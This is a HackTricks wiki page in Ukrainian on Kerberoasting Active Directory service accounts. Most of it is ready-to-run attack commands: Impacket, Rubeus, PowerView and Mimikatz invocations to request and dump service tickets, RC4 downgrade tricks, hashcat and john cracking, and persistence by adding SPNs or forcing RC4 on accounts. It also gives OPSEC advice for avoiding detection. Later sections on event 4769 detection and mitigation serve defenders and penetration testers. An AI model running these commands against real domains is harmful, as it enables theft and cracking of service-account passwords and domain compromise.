# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting зосереджується на отриманні TGS квитків, зокрема тих, що стосуються сервісів, які працюють під обліковими записами користувачів в Active Directory (AD), за винятком облікових записів комп'ютерів. Шифрування цих квитків використовує ключі, які походять з паролів користувачів, що дозволяє проводити офлайн злому облікових даних. Використання облікового запису користувача як сервісу вказується ненульовою властивістю ServicePrincipalName (SPN).

Будь-який автентифікований доменний користувач може запитувати TGS квитки, тому спеціальні привілеї не потрібні.

### Key Points

- Цільові TGS квитки для сервісів, які працюють під обліковими записами користувачів (тобто, облікові записи з встановленим SPN; не облікові записи комп'ютерів).
- Квитки шифруються за допомогою ключа, отриманого з пароля облікового запису сервісу, і можуть бути зламані офлайн.
- Не потрібні підвищені привілеї; будь-який автентифікований обліковий запис може запитувати TGS квитки.

> [!WARNING]
> Більшість публічних інструментів віддають перевагу запиту RC4-HMAC (etype 23) сервісних квитків, оскільки їх швидше зламати, ніж AES. Хеші RC4 TGS починаються з `$krb5tgs$23$*`, AES128 з `$krb5tgs$17$*`, а AES256 з `$krb5tgs$18$*`. Однак багато середовищ переходять на тільки AES. Не припускайте, що тільки RC4 є актуальним.
> Також уникайте "spray-and-pray" roasting. За замовчуванням kerberoast Rubeus може запитувати та отримувати квитки для всіх SPN і є шумним. Спочатку перераховуйте та націлюйте цікаві принципи.

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Інструменти з кількома функціями, включаючи перевірки kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Перелічити користувачів, які підлягають kerberoast.
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Техніка 1: Запитати TGS та вивантажити з пам'яті
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Техніка 2: Автоматичні інструменти
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Запит TGS генерує подію безпеки Windows 4769 (Було запитано квиток служби Kerberos).

### OPSEC та середовища лише з AES

- Намагайтеся отримати RC4 навмисно для облікових записів без AES:
- Rubeus: `/rc4opsec` використовує tgtdeleg для перерахунку облікових записів без AES та запитує квитки служби RC4.
- Rubeus: `/tgtdeleg` з kerberoast також викликає запити RC4, де це можливо.
- Обсмажте облікові записи лише з AES замість тихого провалу:
- Rubeus: `/aes` перераховує облікові записи з увімкненим AES та запитує квитки служби AES (etype 17/18).
- Якщо ви вже маєте TGT (PTT або з .kirbi), ви можете використовувати `/ticket:<blob|path>` з `/spn:<SPN>` або `/spns:<file>` та пропустити LDAP.
- Цілеве націлювання, обмеження та менше шуму:
- Використовуйте `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` та `/jitter:<1-100>`.
- Фільтруйте ймовірно слабкі паролі, використовуючи `/pwdsetbefore:<MM-dd-yyyy>` (старі паролі) або націлюйтеся на привілейовані OUs з `/ou:<DN>`.

Приклади (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Ломка
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

Якщо ви контролюєте або можете змінити обліковий запис, ви можете зробити його kerberoastable, додавши SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Понизьте обліковий запис, щоб увімкнути RC4 для спрощення злому (потрібні права на запис на цільовий об'єкт):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
Ви можете знайти корисні інструменти для атак kerberoast тут: https://github.com/nidem/kerberoast

Якщо ви отримали цю помилку з Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, це пов'язано з локальним зсувом часу. Синхронізуйте з DC:

- `ntpdate <DC_IP>` (застаріло на деяких дистрибутивах)
- `rdate -n <DC_IP>`

### Виявлення

Kerberoasting може бути непомітним. Шукайте подію ID 4769 з DC і застосовуйте фільтри, щоб зменшити шум:

- Виключіть ім'я служби `krbtgt` та імена служб, що закінчуються на `$` (облікові записи комп'ютерів).
- Виключіть запити від облікових записів машин (`*$$@*`).
- Тільки успішні запити (код помилки `0x0`).
- Відстежуйте типи шифрування: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Не сповіщайте лише про `0x17`.

Приклад триажу PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Додаткові ідеї:

- Встановіть базовий рівень нормального використання SPN для кожного хоста/користувача; сповіщайте про великі сплески різних запитів SPN з одного принципала.
- Позначте незвичайне використання RC4 в доменах, захищених AES.

### Пом'якшення / Укріплення

- Використовуйте gMSA/dMSA або облікові записи машин для служб. Керовані облікові записи мають паролі випадкової довжини 120+ символів і автоматично змінюються, що робить офлайн-ламання непрактичним.
- Застосовуйте AES для облікових записів служб, встановивши `msDS-SupportedEncryptionTypes` на AES-only (десяткове 24 / шістнадцяткове 0x18), а потім змініть пароль, щоб ключі AES були отримані.
- Де можливо, вимкніть RC4 у вашому середовищі та контролюйте спроби використання RC4. На DC ви можете використовувати значення реєстру `DefaultDomainSupportedEncTypes`, щоб налаштувати значення за замовчуванням для облікових записів без встановленого `msDS-SupportedEncryptionTypes`. Тестуйте ретельно.
- Видаліть непотрібні SPN з облікових записів користувачів.
- Використовуйте довгі, випадкові паролі для облікових записів служб (25+ символів), якщо керовані облікові записи не є можливими; забороняйте загальні паролі та регулярно проводьте аудит.

### Kerberoast без облікового запису домену (ST, запитувані AS)

У вересні 2022 року Чарлі Кларк показав, що якщо принципал не вимагає попередньої аутентифікації, можливо отримати квиток служби через підроблений KRB_AS_REQ, змінивши sname у тілі запиту, фактично отримуючи квиток служби замість TGT. Це відображає AS-REP roasting і не вимагає дійсних доменних облікових даних.

Дивіться деталі: звіт Semperis “Нові шляхи атак: ST, запитувані AS”.

> [!WARNING]
> Ви повинні надати список користувачів, оскільки без дійсних облікових даних ви не можете запитувати LDAP за допомогою цієї техніки.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Related

If you are targeting AS-REP roastable users, see also:

{{#ref}}
asreproast.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
- SpecterOps – Rubeus Roasting documentation: https://docs.specterops.io/ghostpack/rubeus/roasting

{{#include ../../banners/hacktricks-training.md}}
